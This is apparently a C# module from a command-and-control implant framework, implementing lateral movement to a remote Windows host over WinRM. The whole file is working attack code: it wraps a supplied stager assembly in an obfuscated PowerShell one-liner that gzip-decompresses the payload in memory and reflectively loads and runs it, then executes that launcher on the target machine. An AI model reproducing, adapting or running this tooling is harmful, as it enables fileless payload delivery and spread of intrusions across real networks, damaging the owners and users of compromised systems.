using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;

namespace Agent.Modules
{
    public class JumpModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        readonly string PowerShellTemplate = @"sv d ([System.Convert]::FromBase64String('{{COMPRESSED}}'));sv i (New-Object System.IO.MemoryStream(,(gv d).Value));sv o (New-Object System.IO.MemoryStream);sv g (New-Object System.IO.Compression.GzipStream (gv i).Value,([IO.Compression.CompressionMode]::Decompress));((gv g).Value).CopyTo((gv o).Value);[System.Reflection.Assembly]::Load(((gv o).Value).ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))";

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Jump",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "WinRM",
                        Delegate = JumpWinRM
                    }
                }
            };
        }

        void JumpWinRM(string AgentID, AgentTask Task)
        {
            try
            {
                var target = (string)Task.Parameters["Target"];
                var stager = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
                var launcher = GenerateLauncher(stager);

                var winrm = new WinRMExec(target);
                winrm.Execute(launcher);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        string GenerateLauncher(byte[] payload)
        {
            var compressed = Convert.ToBase64String(Shared.Utilities.Utilities.Compress(payload));
            var launcher = PowerShellTemplate.Replace("{{COMPRESSED}}", compressed);
            return launcher;
        }
    }
}